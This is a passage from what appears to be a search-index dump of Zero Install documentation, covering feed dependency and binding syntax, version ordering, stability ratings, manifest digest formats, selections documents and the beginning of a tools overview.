] *\n&lt;/requires&gt;\n</code></pre> <p>The constraint elements (if any) limit the set of acceptable versions. The bindings specify how 0install should make its choice known (typically, by setting environment variables).</p> <p>The <code>use</code> attribute can be used to indicate that this dependency is only needed in some cases. By default, 0install &gt;= 0.43 will skip any <code>&lt;requires&gt;</code> element with this attribute set. Earlier versions process all <code>&lt;requires&gt;</code> elements whether this attribute is present or not. 0test &gt;= 0.2 will process dependencies where <code>use=\"testing\"</code>, in addition to the program's normal dependencies. This attribute is deprecated - it's usually better to use a <code>&lt;command&gt;</code> for this.</p> <p>The <code>importance</code> attribute (0install &gt;= 1.1) can be either <code>essential</code> (the default; a version of this dependency must be selected) or <code>recommended</code> (no version is also an option, although selecting a version is preferable to not selecting one).</p> <p>The <code>version</code> attribute (0install &gt;= 1.13) provides a quick way to specify the permitted versions. See the Constraints section below.</p> <p>The <code>distribution</code> attribute (0install &gt;= 1.15) can be used to require the selected implementation to be from the given distribution. For example, a Python library available through MacPorts can only be used with a version of Python which is also from MacPorts. The value of this attribute is a space-separated list of distribution names. In addition to the official list of distribution names, the special value <code>0install</code> may be used to require an implementation provided by 0instal (i.e. one not provided by a <code>&lt;package-implementation&gt;</code>).</p> <p>The <code>os</code> attribute (0install &gt;= 1.12) can be used to indicate that the dependency only applies to the given OS (e.g. <code>os=\"Windows\"</code> for dependencies only needed on Windows systems).</p> <p>The <code>source</code> attribute (0install &gt;= 2.8) can be used to indicate that a source implementation is needed rather than a binary. This may be useful if you want to get e.g. header files from a source package. Note that if you select both source and binary implementations of an interface, 0install does not automatically force them to be the same version.</p> <p>A <code>&lt;restricts&gt;</code> element (0install &gt;= 1.10) can be used to apply constraints without creating a dependency:</p> <pre><code>&lt;restricts interface='...'\n           version='...' ?\n           os='...' ?\n           distribution='...' ? &gt;\n  [ constraints ] *\n&lt;/restricts&gt;\n</code></pre> <p>Internally, <code>&lt;restricts&gt;</code> behaves much like <code>&lt;requires importance='recommended'&gt;</code>, except that it doesn't try to cause the interface to be selected at all.</p>"},{"location":"specifications/feed/#constraints","title":"Constraints","text":"<p>Constraints appear on <code>&lt;requires&gt;</code>, <code>&lt;restricts&gt;</code>, <code>&lt;package-implementation&gt;</code> and <code>&lt;runner&gt;</code> elements. They restrict the set of versions from which 0install may choose an implementation.</p> <p>Since 0install 1.13, you can use the <code>version</code> attribute on the dependency element. The attribute's value is a list of ranges, separated by <code>|</code>, any of which may match.</p> <p>Example</p> <pre><code>&lt;restricts interface='https://apps.0install.net/python/python.xml'\n           version='2.6..!3 | 3.2.2..'/&gt;\n</code></pre> <p>This allows Python versions 2.6, 2.7 and 3.3, but not 2.5 or 3.</p> <p>Each range is in the form <code>START..!END</code>. The range matches versions where <code>START</code> &lt;= <code>VERSION</code> &lt; <code>END</code>. The start or end may be omitted. A single version number may be used instead of a range to match only that version, or <code>!VERSION</code> to match everything except that version.</p> <p>There is also an older syntax which also works with 0install &lt; 1.13, where a child node is used instead:</p> <pre><code>&lt;version not-before='...' ?\n         before='...' ? &gt;\n</code></pre> <code>not-before</code> This is the lowest-numbered version that can be chosen. <code>before</code> This version and all later versions are unsuitable. <p>Example</p> <pre><code>&lt;version not-before='2.4' before='2.6'&gt;\n</code></pre> <p>allows any of these versions: 2.4, 2.4.0, and 2.4.8. It will not select 2.3.9 or 2.6.</p> <p>This older syntax is not supported with <code>&lt;packager-implementation&gt;</code>.</p>"},{"location":"specifications/feed/#bindings","title":"Bindings","text":"<p>Bindings specify how the chosen implementation is made known to the running program. Bindings can appear in a <code>&lt;requires&gt;</code> element, in which case they tell a component how to find its dependency, or in an <code>&lt;implementation&gt;</code> (or group), where they tell a component how to find itself.</p> <p></p>"},{"location":"specifications/feed/#environment-bindings","title":"Environment bindings","text":"<pre><code>&lt;environment name='...'\n             (insert='...' | value='...')\n             mode='prepend|append|replace' ?\n             separator='...' ?\n             default='...' ? /&gt; *\n</code></pre> <p>Details of the chosen implementation are passed to the program by setting environment variables, as specified by the <code>&lt;environment&gt;</code> elements (typically, there will be exactly one of these in each <code>&lt;requires&gt;</code> element). Each environment element gives the name of the variable and the relative path of the item within the implementation to insert into the variable's value.</p> <p>Usually, the (badly-named) <code>insert</code> attribute is used, which adds a path to a file or directory inside the implementation to the environment variable. For example, <code>&lt;environment name='PATH' insert='bin'/&gt;</code> would perform something similar to the bash shell statement <code>export PATH=/path/to/impl/bin:$PATH</code>.</p> <p>Alternatively, you can use the <code>value</code> attribute to use a literal string. For example, <code>&lt;environment name='GRAPHICAL_MODE' value='TRUE' mode='replace'/&gt;</code>. This requires 0install &gt;= 0.52.</p> <p>If <code>mode</code> is <code>prepend</code> (or not set), then the absolute path of the item is prepended to the current value of the variable. The default separator character is the colon character on POSIX systems, and semi-colon on Windows. This can be overridden using <code>separator</code> (0install &gt;= 1.1). If the environment variable is not currently set then the path is prepended to the value of the default attribute. If no default value is given either then the default for that environment variable is used, or the environment variable's value is set to the absolute path directly if there is no default.</p> <p>If <code>mode</code> is <code>append</code> then the same thing happens, except that the new value is added at the end instead of the beginning. If the mode is <code>replace</code> then the old value is overwritten, and the <code>default</code> attribute is ignored.</p> <p>The following environment variables have known defaults and therefore the <code>default</code> attribute is not needed with them:</p> Name Default <code>PATH</code> <code>/bin:/usr/bin</code> <code>XDG_CONFIG_DIRS</code> <code>/etc/xdg</code> <code>XDG_DATA_DIRS</code> <code>/usr/local/share:/usr/share</code>"},{"location":"specifications/feed/#executable-bindings","title":"Executable bindings","text":"<p>These both require 0install &gt;= 1.2.</p> <pre><code>&lt;executable-in-var name='...'\n                   command='...' ? /&gt;\n\n&lt;executable-in-path name='...'\n                    command='...' ? /&gt;\n</code></pre> <p>These are used when the program needs to run another program. <code>command</code> says which of the program's commands to use; the default is <code>run</code>.</p> <p><code>&lt;executable-in-var&gt;</code> stores the path of the selected executable in the named environment variable.</p> <p>Example</p> <p>If a program uses <code>$MAKE</code> to run make, you can provide the required command like this: <pre><code>&lt;requires interface=\"https://apps.0install.net/devel/make.xml\"&gt;\n  &lt;executable-in-var name='MAKE'/&gt;\n&lt;/requires&gt;\n</code></pre></p> <p><code>&lt;executable-in-path&gt;</code> works in a similar way, except that it adds a directory containing the executable to <code>$PATH</code>.</p> <p>Example</p> <p>If the program instead just runs the <code>make</code> command, you would use: <pre><code>&lt;requires interface=\"https://apps.0install.net/devel/make.xml\"&gt;\n  &lt;executable-in-path name='make'/&gt;\n&lt;/requires&gt;\n</code></pre></p> <p>It is preferable to use <code>&lt;executable-in-var&gt;</code> where possible, to avoid making <code>$PATH</code> very long.</p> <p>Implementation note</p> <p>On POSIX systems, 0install will create a shell script under <code>~/.cache/0install.net/injector/executables</code> and pass the path of this script.</p>"},{"location":"specifications/feed/#generic-bindings","title":"Generic bindings","text":"<p>Custom bindings can be specified using the <code>&lt;binding&gt;</code> element (0install &gt;= 2.1). 0install will not know how to run a program using custom bindings itself, but it will include them in any selections documents it creates, which can then be executed by your custom code. The syntax is:</p> <pre><code>&lt;binding path='...' ?\n         command='...' ?\n         ... &gt;\n  ...\n&lt;/binding&gt;\n</code></pre> <p>If <code>command</code> is given, then 0install will select the given <code>&lt;command&gt;</code> within the implementation (which may cause additional dependencies and bindings to be selected). Otherwise, no command is selected.</p> <p>Any additional attributes and child elements are not processed, but are just passed through. If your binding needs a path within the selected implementation, it is suggested that the <code>path</code> attribute be used for this. Other attributes and child elements should be namespaced to avoid collisions.</p> <p>Example</p> <p>The EBox application launcher allows each code module to specify its dependencies, which are then available in the module's scope as getters. The ebox-edit application depends on the help library like this:</p> <pre><code>&lt;requires interface=\"http://0install.net/tests/ebox-help.xml\"&gt;\n  &lt;binding e:getter='help'/&gt;\n&lt;/requires&gt;\n</code></pre>"},{"location":"specifications/feed/#versions","title":"Versions","text":"<p>A version number string has the following form:</p> <pre><code>Version := DottedList (\"-\" Modifier? DottedList?)*\nDottedList := (Integer (\".\" Integer)*)\nModifier := \"pre\" | \"rc\" | \"post\"\n</code></pre> <p>Numerically, the modifiers come in the order <code>-pre</code> (pre-release), <code>-rc</code> (release candidate), <code>-</code> (no modifier name), <code>-post</code> (post-release or patch level). Versions are ordered like this:</p> <ul> <li>0.1</li> <li>1</li> <li>1.0</li> <li>1.1</li> <li>1.2-pre</li> <li>1.2-pre1</li> <li>1.2-rc1</li> <li>1.2</li> <li>1.2-0</li> <li>1.2-post</li> <li>1.2-post1-pre</li> <li>1.2-post1</li> <li>1.2.1-pre</li> <li>1.2.1.4</li> <li>1.2.2</li> <li>1.2.10</li> <li>3</li> </ul> <p>0install doesn't care about anything other than the sort order (i.e., whether one version comes before or after another). It is expected that an implementation can be safely replaced by one with a later version number, but not necessarily with an earlier one. So, if an application works with version <code>1.2.1</code> of a library then it should also work with version <code>1.2.2</code> or <code>1.3</code> or even <code>5.7</code>, but not <code>1.2.0</code>. This is a little different to some other systems, where numbers in different places have different meanings.</p> <p>For example, if the latest version of a library you use is version 5.1, then you shouldn't add the restriction <code>before='5.2'</code>, because when 5.2 comes out it should still work with your program. Of course, this might not always work, and hopefully the problem will be reported while the new library version is marked as testing (before most users hit the problem). Once you know that 5.2 is a problem, you can add the <code>before='5.2'</code> restriction to the implementation then.</p> <p>Incompatible changes (where a newer version cannot be used in place of an older version) to an interface should be handled by creating a new interface URI. Eg:</p> <ul> <li><code>http://gtk.org/2005/interfaces/GTK-1.2.x</code> (contains 1.2.0, 1.2.1, 1.2.2, ...)</li> <li><code>http://gtk.org/2005/interfaces/GTK-2.x</code> (contains 2.0.0, 2.0.1, 2.2.0, 2.4.0, 2.4.1, ...)</li> </ul> <p>The integers in version numbers must be representable as 64-bit signed integers.</p> <p>Note</p> <p>Version numbers containing dash characters were not supported before version 0.24 of 0install and so a <code>version-modifier</code> attribute was added to allow new-style versions to be added without breaking older versions. This should no longer be used.</p>"},{"location":"specifications/feed/#stability","title":"Stability","text":"<p>The feed file also gives a stability rating for each implementation. The following levels are allowed (must be lowercase in the feed files):</p> <ul> <li><code>stable</code></li> <li><code>testing</code></li> <li><code>developer</code></li> <li><code>buggy</code></li> <li><code>insecure</code></li> </ul> <p>Stability ratings are expected to change over time. When any new release is made, its stability should be set to <code>testing</code>. Users who have selected Help test new versions will then start using it. Other users will continue with the previous stable release. After a while (days, weeks or months, depending on the project) with no serious problems found, the implementation's stability can be changed to <code>stable</code> so that everyone will use it.</p> <p>If problems are found, it can instead be marked as <code>buggy</code>, or <code>insecure</code>. 0install won't select either by default, but it is useful to users to see the reason (users may opt to continue using a buggy version if it seems to work for them, but they should never use an insecure one). <code>developer</code> is like a more extreme version of <code>testing</code>, where the program is expected to have bugs.</p>"},{"location":"specifications/feed/#when-to-use-buggy","title":"When to use 'buggy'","text":"<p>Don't mark old releases as <code>buggy</code> every time you do a new release, just because a few bugs have been fixed. People who have selected <code>Network use: Full</code> will automatically upgrade to the new version anyway, so marking an older version as buggy only affects people who have explicitly stated that they don't want to use the latest version, but would prefer to use an older release to save network use.</p>"},{"location":"specifications/feed/#staged-rollouts","title":"Staged rollouts","text":"<p>Note</p> <p>This is currently only supported by Zero Install for Windows.</p> <p>Staged rollouts allow you to distribute new versions of a program to a subset of users that you can increase over time. Set the <code>rollout-percentage</code> attribute on an <code>&lt;implementation&gt;</code> to control the percentage of users that should treat it as if <code>stability=\"stable\"</code>.</p> <p>The rollout probability is applied locally by randomly choosing and persisting a number between <code>1</code> and <code>100</code> per feed and implementation.</p>"},{"location":"specifications/feed/#entry-points","title":"Entry points","text":"<p>Note</p> <p>This is currently only used by Zero Install for Windows.</p> <p>Entry points allow you to associate additional information with <code>&lt;command&gt;</code> names, such as user-friendly names and descriptions. Entry points are used by the Zero Install GUI to help the user choose a command and by the desktop integration system to generate appropriate menu entries for commands. An entry point is not necessary for a command to work but it makes it more discoverable to end-users.</p> <p>Entry points are top-level elements and, unlike commands, are not associated with any specific implementation or group. One entry point represents all commands in all implementations that carry the same name. An entry point has this syntax:</p> <pre><code>  &lt;entry-point command='...'\n               binary-name='...' ?\n               app-id='...' ? &gt;\n    &lt;needs-terminal/&gt; ?\n    &lt;suggest-auto-start/&gt; ?\n    &lt;suggest-send-to/&gt; ?\n    &lt;name xml:lang='...' ?&gt;...&lt;/name&gt; *\n    &lt;summary xml:lang='...' ?&gt;...&lt;/summary&gt; *\n    &lt;description xml:lang='...' ?&gt;...&lt;/description&gt; *\n    &lt;icon type='...' href='...'/&gt; *\n  &lt;/group&gt;\n</code></pre> <code>command</code> the name of the command this entry point represents <code>binary-name</code> the canonical name of the binary supplying the command (without file extensions); this is used to suggest suitable alias names. <code>app-id</code> the Application User Model ID; used by Windows to associate shortcuts and pinned taskbar entries with running processes. May not be longer than 128 characters and may not contain whitespace. <code>&lt;needs-terminal&gt;</code> if present, this element indicates that the command represented by this entry point requires a terminal in order to run. <code>&lt;suggest-auto-start&gt;</code> if present, this element indicates that this entry point should be offered as an auto-start candidate to the user. <code>&lt;suggest-send-to&gt;</code> if present, this element indicates that this entry point should be offered as a candidate for the \"Send To\" context menu to the user. <code>&lt;name&gt;</code> user-friendly name for the command. If not present, the value of the <code>command</code> attribute is used instead. Supports localization. <code>&lt;summary&gt;</code> a short one-line description; the first word should not be upper-case unless it is a proper noun (e.g. \"cures all ills\"). Supports localization. <code>&lt;description&gt;</code> a full description, which can be several paragraphs long. Supports localization. <code>&lt;icon&gt;</code> an icon to represent the command; this is used when creating menu entries. You should provide an icon of the type <code>image/png</code> (<code>.png</code>) for Linux apps and <code>image/vnd.microsoft.icon</code> (<code>.ico</code>) for Windows apps."},{"location":"specifications/feed/#localization","title":"Localization","text":"<p>Some elements can be localized using the <code>xml:lang</code> attribute.</p> <p>Example</p> <pre><code>&lt;summary xml:lang=\"en\"&gt;cures all ills&lt;/summary&gt;\n&lt;summary xml:lang=\"de\"&gt;heilt alle Krankheiten&lt;/summary&gt;\n</code></pre> <p>When choosing a localized element Zero Install will prefer <code>xml:lang</code> values in the following order:</p> <ul> <li>Exactly matching the users language (e.g., <code>de-DE</code>)</li> <li>Matching the users with a neutral culture (e.g., <code>de</code>)</li> <li><code>en</code></li> <li><code>en-US</code></li> </ul>"},{"location":"specifications/feed/#metadata","title":"Metadata","text":"<p>All elements can contain extension elements, provided they are not in the Zero Install namespace used by the elements defined here. 0install does not currently make use of these elements itself, but other programs may find them useful. In future, some of these may be used (for example, the GUI may display the license terms).</p> <p>The use of Dublin Core is suggested for the following concepts, which have the following meanings when found as a direct child of a <code>&lt;group&gt;</code> or <code>&lt;implementation&gt;</code> element:</p> <code>dc:creator</code> The primary author of the program. <code>dc:publisher</code> The person who created this implementation. For a binary, this is the person who compiled it. <p>Other Dublin Core terms that may be useful include <code>contributor</code>, <code>dateCopyrighted</code>, <code>language</code>, <code>rights</code> and <code>rightsHolder</code>.</p> <p>These terms are not required as they are duplicated by the core Zero Install terms: <code>identifier</code> (<code>id</code>), <code>available</code> (<code>released</code>) and <code>requires</code> (<code>requires</code>).</p> <p>The source element may be used in future to record the source used to build this implementation.</p>"},{"location":"specifications/feed/#digital-signatures","title":"Digital signatures","text":"<p>When a feed is downloaded from the web, it must contain a digital signature. A feed is signed by appending an XML comment block of the form:</p> <pre><code>&lt;!-- Base64 Signature\niD8DBQBEXM/qrgeCgFmlPMERArNSAKDBuNz5SQMZ8rwJmW2fhNHJwor6KwCgwx7XEfY+6gUC90rJ\nb5eCY+I8HNA=\n\n--&gt;\n</code></pre> <p>This block must go at the end of the file, and contains a Base64-encoded version of the file that would be created by using <code>gpg --detach-sign</code> on the original feed. The signature block must start on a new line, may not contain anything except valid base64 characters, and nothing may follow the signature block. XML signature blocks are supported from version 0.18 of 0install and may be generated easily using the 0publish command.</p> <p>Local interfaces are plain XML, although having an XML signature block is no problem as it will be ignored as a normal XML comment.</p>"},{"location":"specifications/feed/#valid-architecture-names","title":"Valid architecture names","text":"<p>The <code>arch</code> attribute is a value in the form <code>OS-CPU</code>. The values come from the <code>uname</code> system call, but there is some normalisation (e.g. because Windows doesn't report the same CPU names as Linux). Valid values for OS include:</p> <ul> <li><code>*</code></li> <li><code>Cygwin</code> (a Unix-compatibility layer for Windows)</li> <li><code>Darwin</code> (MacOSX, without the proprietary bits)</li> <li><code>FreeBSD</code></li> <li><code>Linux</code></li> <li><code>MacOSX</code></li> <li><code>Windows</code></li> </ul> <p>Valid values for CPU include:</p> <ul> <li><code>*</code></li> <li><code>src</code></li> <li><code>i386</code></li> <li><code>i486</code></li> <li><code>i586</code></li> <li><code>i686</code></li> <li><code>ppc</code></li> <li><code>ppc64</code></li> <li><code>x86_64</code></li> <li><code>armv6l</code></li> <li><code>armv7l</code></li> <li><code>aarch64</code></li> </ul>"},{"location":"specifications/feed/#the-if-0install-version-attribute","title":"The <code>if-0install-version</code> attribute","text":"<p>To make it possible to use newer features in a feed without breaking older versions of 0install, the <code>if-0install-version</code> attribute may be placed on any element to indicate that the element should only be processed by the specified versions of 0install.</p> <p>Example</p> <pre><code>&lt;group&gt;\n  &lt;new-element if-0install-version='1.14..'/&gt;\n  &lt;fallback if-0install-version='..!1.14'/&gt;\n&lt;/group&gt;\n</code></pre> <p>In this example, 0install 1.14 and later will see <code>&lt;new-element&gt;</code>, while older versions see <code>&lt;fallback&gt;</code>. The syntax is as described in Constraints.</p> <p>Attention</p> <p>0install versions before 1.13 ignore this attribute and process all elements.</p>"},{"location":"specifications/feed/#well-known-extensions","title":"Well-known extensions","text":"<p>The following are well-known extensions to the Zero Install format:</p> <ul> <li>Capabilities (provides information for desktop integration of applications)</li> </ul>"},{"location":"specifications/feed/#future-plans","title":"Future plans","text":"<ul> <li>The extra meta-data elements need to be better specified.</li> <li>As well as before and not-before, we should support after and not-after.</li> <li>It should be possible to give a delta (binary patch) against a previous version, to make upgrading quicker.</li> <li>It should be possible to scope bindings. For example, when a DTP package requires a clipart package, the clipart package should not be allowed to affect the DTP package's environment.</li> </ul>"},{"location":"specifications/manifest/","title":"Manifest files","text":"<p>Zero Install implementations are directory trees identified by an algorithm name (e.g., \"sha256\"), and digest of their contents calculated using that algorithm. Adding, deleting, renaming or modifying any file in a tree will change its digest. It should be infeasibly difficult to generate a new tree with the same digest as a given tree. Thus, if you know the digest of the implementation you want, and someone gives you a tree with that digest, you can trust that it is the implementation you want.</p> <p>This document describes how a digest is calculated from a directory tree.</p>"},{"location":"specifications/manifest/#algorithms","title":"Algorithms","text":"<p>There are several different algorithms that can be used to generate a digest from a directory tree, so an implementation's identifier includes the algorithm. This allows new algorithms to be added easily if weaknesses are discovered in older ones. The currently supported algorithms are:</p> <code>sha1=XXX</code> This is supported by all versions of 0install. It is less secure than the format used with the other algorithms. <code>sha1new=XXX</code> Supported from version 0.20. This is the same hash as <code>sha1</code> but with the new manifest format. <code>sha256=XXX</code> Supported from version 0.20 and also requires the <code>hashlib</code> Python module to be installed. <code>sha256new_XXX</code> Supported from version 1.10. This is the same as <code>sha256</code>, except that the final digest is base32-encoded (without padding) to make it a bit shorter, and the separator character is <code>_</code> rather than <code>=</code>, as pathnames containing <code>=</code> cause problems for some programs. <p>When checking a new tree (e.g., that has just been downloaded from the net and unpacked), 0install generates a 'manifest' file. The manifest lists every file, directory and symlink in the tree, and gives the digest of each file's content. Here is a sample manifest file for a tree containing two files (<code>README</code> and <code>src/main.c</code>) and using the <code>sha1</code> algorithm (you can use <code>0install digest --manifest</code> to generate this):</p> <pre><code>F 0a4d55a8d778e5022fab701977c5d840bbc486d0 1132502750 11 README\nD 1132502769 /src\nF 83832457b29a423c8e6daf05c6dbcba17d0514dd 1132502769 17 main.c\n</code></pre> <p>If you generate a manifest file for a directory tree and find that it is identical to the manifest file you want, then you can feel confident that you have the tree you want. This is convenient, because the manifest file is much smaller than the packaged tree.</p> <p>After checking, the generated manifest file is stored in a file called <code>.manifest</code> in the top-level of the tree.</p> <p>To save even more space, we can simply compare the digests (rather than the contents) of these manifest files. For example, the digest of the three-line manifest file above is given by:</p> <pre><code>$ sha1sum .manifest\nb848561cd89be1b806ee00008a503c63eb4ad56e\n</code></pre> <p>When 0install adds a new archive to the cache, the top-level directory is renamed to this final digest (so the <code>main.c</code> above would be stored as <code>.../sha1=b848561cd89be1b806ee00008a503c63eb4ad56e/src/main.c</code>, for example).</p> <p>Because only the digest of the manifest is needed, it is not strictly necessary to store the <code>.manifest</code> file at all. However, if the tree is modified later somehow it can show you exactly which files were changed (rather than just letting you know that the tree has changed in some unknown way).</p>"},{"location":"specifications/manifest/#manifest-file-format","title":"Manifest file format","text":"<p>This description of the manifest file is based on Joachim's 12 Oct 2005 post to the zero-install-devel list:</p> <p>The manifest file lists, line by line, all nodes in a directory identified as <code>/</code>, without <code>/</code> itself. All relevant numbers are coded as decimal numbers without leading zeros (unless 0 is to be coded, which is coded as <code>0</code>). Times are represented as the number of seconds since the epoch. Nodes are of one of their possible types: <code>D</code>, <code>F</code>, <code>X</code>, and <code>S</code>. Names must not contain newline characters (the tree will be rejected if they do).</p> <p>The file itself is encoded as UTF-8, with Unix line-endings (<code>\\n</code>) and no BOM. Note that some operating systems treat filenames as sequences of bytes (rather than as sequences of characters), and thus may be able to handle filenames which cannot be represented as strings. A Zero Install implementation cannot contain such filenames.</p>"},{"location":"specifications/manifest/#directories","title":"Directories","text":"<p><code>D</code> nodes correspond to directories, and their line format is:</p> <pre><code>\"D\", space, [mtime, space,] full path name, newline\n</code></pre> <p>So, top level directories, for example, would have a \"full path name\" that matches the regular expression <code>^/[^/\\n]+$</code>.</p> <p>The modification time is only included when using the original <code>sha1</code> algorithm, as it was not found to be useful and caused problems with many archives.</p>"},{"location":"specifications/manifest/#files","title":"Files","text":"<p><code>F</code> and <code>X</code> nodes correspond to files and executable files, respectively, and their line formats are:</p> <pre><code>\"F\", space, hash, space, mtime, space, size, space, file name, newline\n\"X\", space, hash, space, mtime, space, size, space, file name, newline\n</code></pre> <p>As opposed to directories, no full path names are given. Hence, file names match <code>^[^/\\n]+$</code> . The hash is the hexadecimal representation of the digest of the contents of the respective file, using the same digest algorithm as the manifest file itself. Hexadecimal digits a through f are used (rather than A through F).</p>"},{"location":"specifications/manifest/#symlinks","title":"Symlinks","text":"<p><code>S</code> nodes correspond to symbolic links, and their line format is:</p> <pre><code>\"S\", space, hash, space, size, space, symlink name, newline\n</code></pre> <p>The symlink name is given analogously to file names in <code>F</code> and <code>X</code> nodes. The size of a symlink is the number of bytes in its target (name). The hash sum, similarly to that of files, is the digest of the target (name) of the respective symlink.</p>"},{"location":"specifications/manifest/#other-files-types","title":"Other files types","text":"<p>It is an error for a tree to contain other types of object (such as device files). Such trees are rejected.</p>"},{"location":"specifications/manifest/#ordering","title":"Ordering","text":"<p>These lines appear in the order of a depth-first search. Within a directory, regular files and symlinks come first (ordered lexicographically by their name, i.e., they appear in the order that <code>LC_ALL=C sort</code> would produce), and then each subdirectory (again sorted in the same way).</p> <p>For the original <code>sha1</code> algorithm the sort order is slightly different: sub-directories, regular files and symlinks are all sorted together rather than the subdirectories always coming after other types.</p> <p>Implementations have to abide by these rules to the letter because such a file is to be generated automatically and this process absolutely must generate the same file that the directory tree packager had computed.</p>"},{"location":"specifications/selections/","title":"Selections files","text":"<p>This document describes the format of 0install's XML selections documents. A selections document contains all the information needed to launch a program. 0install generates a selections document by collecting information from multiple feeds and then running a solver to choose the best combination of components.</p> <p>For example, to generate the selections document for the ROX Edit application:</p> <pre><code>0install select --xml http://rox.sourceforge.net/2005/interfaces/Edit\n</code></pre> <p>For an app, foo, the current selections can be found in <code>~/.config/0install.net/apps/foo/selections.xml</code>. For binaries generated by 0compile, the selections used to build it can be found in the <code>0install</code> directory of the binary package, in the <code>build-environment.xml</code> file.</p>"},{"location":"specifications/selections/#selections","title":"&lt;selections&gt;","text":"<p>A selections document contains a set of selections, one per selected interface.</p> <pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;selections\n    xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"\n    interface=\"...\"\n    command=\"...\" ?\n    source=\"true|false\" ? &gt;\n\n  [ selection ] +\n&lt;/selections&gt;\n</code></pre> <code>interface</code> The URI of the main program being run (e.g. \"http://rox.sourceforge.net/2005/interfaces/Edit\"). <code>command</code> The name of the (optional) <code>&lt;command&gt;</code> to run on the main program (e.g. \"run\"). <code>source</code> Indicates whether the root is source or binary (since 0install 2.8). This is useful if implementations of both are present."},{"location":"specifications/selections/#historical-notes","title":"Historical notes","text":"<p>Before 0install 1.2, there was no <code>command</code> attribute on the root. Instead, the root <code>&lt;selections&gt;</code> element also contained a set of <code>&lt;command&gt;</code> elements as direct children. The first <code>&lt;command&gt;</code> was for the main interface, the second was for its <code>&lt;runner&gt;</code> and so on. In later versions, the commands go inside their <code>&lt;selection&gt;</code> elements, which is needed to support executable bindings.</p> <p>Before 0install 0.51, there were no commands at all. Instead, the <code>&lt;selection&gt;</code> for the main interface had a <code>main</code> attribute which was used (the command should be treated as \"run\" in this case).</p>"},{"location":"specifications/selections/#selection","title":"&lt;selection&gt;","text":"<pre><code>&lt;selection\n      interface=\"...\"\n      from-feed=\"...\" ?\n      local-path=\"...\" ?\n      quick-test-file=\"...\" ?\n      quick-test-mtime=\"...\" ?\n      requires-compilation=\"true\" ?\n      ... &gt;\n    [ dependencies ]\n    [ bindings ]\n    [ digests ]\n    [ commands ]\n&lt;/selection&gt;\n</code></pre> <code>interface</code> Indicates that this is the selected implementation of this interface. <code>from-feed</code> The URL of the feed which provided this implementation. If missing, use the value of <code>interface</code>. <code>local-path</code> For local implementations, this is the path of the directory containing the implementation. <code>quick-test-file</code> A file which, if present, indicates that the selection is still valid. This is sometimes used with distribution-provided selections. If not present and the ID starts with \"package:\", you'll need to query the distribution's package manager to check that this version is still installed. <code>quick-test-mtime</code> If present, the quick test file must not only exist, but must have this <code>mtime</code> (an integer number of seconds since the Unix epoch). For systems which provide more accurate times, ignore the fractional part (round down towards zero). <code>requires-compilation</code> If present, this attribute indicates that the selection does not yet exist, but could be compiled from the source implementation with the same <code>id</code>. Such selections can be generated when using <code>0install select --may-compile</code> (0install &gt;= 2.9). Other attributes All attributes from the selected <code>&lt;implementation&gt;</code> are included on the <code>&lt;selection&gt;</code>, except for <code>stability</code> and the deprecated <code>main</code> and <code>self-test</code> attributes, which were replaced by commands. The most useful ones are <code>id</code> and <code>version</code>. <p>The <code>dependencies</code>, <code>bindings</code>, <code>digests</code> and <code>commands</code> are defined in the feed specification. <code>&lt;restricts&gt;</code> elements are not included.</p> <p>As in feed files, the <code>id</code> may also be used as a digest or a local path in older documents. See the feed specification for details.</p>"},{"location":"specifications/selections/#executing-the-selections","title":"Executing the selections","text":"<p>0install performs the following steps when running an app:</p> <ol> <li>Load the saved selections XML (or do an update if missing).</li> <li>Check that they are valid and up-to-date.</li> <li>Process all the bindings to set up the new environment.</li> <li>Build the command line arguments, starting with the main command and following the chain of <code>&lt;runner&gt;</code>s.</li> <li>Exec the new process.</li> </ol>"},{"location":"specifications/selections/#checking-the-selections-are-up-to-date","title":"Checking the selections are up-to-date","text":"<p>This is how 0install checks the selections for an app before running them:</p> <ol> <li> <p>If any input files have changed or disappeared since the solver last ran, we re-run the solver. The files checked are:</p> <ul> <li>The previously selected feed files (local or cached).</li> <li>Configuration files for the selected interfaces (e.g. preferred stability).</li> <li>The global configuration file (e.g. preferred stability).</li> </ul> <p>0install currently ignores feeds and interfaces which were considered but not selected.</p> </li> <li> <p>If any selections are no longer present, we rerun the solver. For distribution packages, we check that the version hasn't changed.</p> </li> <li> <p>If it has been a while since we checked for updates, we trigger a background update but run the current selections anyway.</p> </li> </ol>"},{"location":"specifications/selections/#processing-bindings","title":"Processing bindings","text":"<p>For each <code>&lt;selection&gt;</code>, 0install will:</p> <ol> <li>Process all bindings directly inside the <code>&lt;selection&gt;</code>.</li> <li>Process all dependencies directly inside the <code>&lt;selection&gt;</code>:<ol> <li>Find the selection for the required interface (note: may be missing for non-essential dependencies).</li> <li>Process all bindings inside the dependency.</li> </ol> </li> <li>Process all commands directly inside the <code>&lt;selection&gt;</code>:<ol> <li>Process all bindings inside the command.</li> <li>Process all dependencies inside the command, including their bindings (as above) and also including any <code>&lt;runner&gt;</code>.</li> </ol> </li> </ol> <p>Having located all the bindings:</p> <ol> <li>Calculate the environment for the new process by expanding all <code>&lt;environment&gt;</code> bindings.</li> <li>Process all <code>&lt;executable-in-var&gt;</code> and <code>&lt;executable-in-path&gt;</code> bindings. Note: you must do this after expanding all other environment variables because of $-expansion in <code>&lt;arg&gt;</code>.</li> </ol> <p>A binding directly inside a <code>&lt;selection&gt;</code> or <code>&lt;command&gt;</code> binds a selection to itself (e.g. a Python library may wish to add itself to PYTHONPATH). Bindings inside dependencies bind to the dependency (e.g. a Python program may wish to add a library to <code>PYTHONPATH</code>).</p> <p>A distribution-provided selection does not have a path, and so any <code>&lt;environment&gt;</code> bindings for it are skipped (e.g. it's up to the distribution package manager to ensure that Python libraries it provides are in the default search path).</p>"},{"location":"specifications/selections/#future-plans","title":"Future plans","text":"<p>Indexing the selections by interface URI is a bit restrictive. Once we get scoping, we'll need to cope with e.g. a Python 2 program that depends on a Python 3 program, which will require two different selections for the Python interface.</p>"},{"location":"tools/","title":"Tools overview","text":"<p>This section contains various utility programs that make using Zero Install easier.</p>"},{"location":"tools/#publishing-and-updating-feeds","title":"Publishing and updating feeds","text":"0downstream 0downstream can be used to automatically create and update feed files for an existing open source project page on a site like github, pypi or rubygems.org. 0publish 0publish edits feed files in place. It loads the file, transforms it in some way (such as setting the release date, or adding a new implementation) and then writes it back out again. If the input file was signed, it will resign it when saving with the same key by default. You can also use it to add a signature, or to change the signing key. It is particularly useful in release scripts. 0publish-gui 0publish-gui provides a simple graphical interface for creating and editing these feeds. 0release 0release can be used to make new releases of your software. It handles details such as setting the version number and release date, tagging 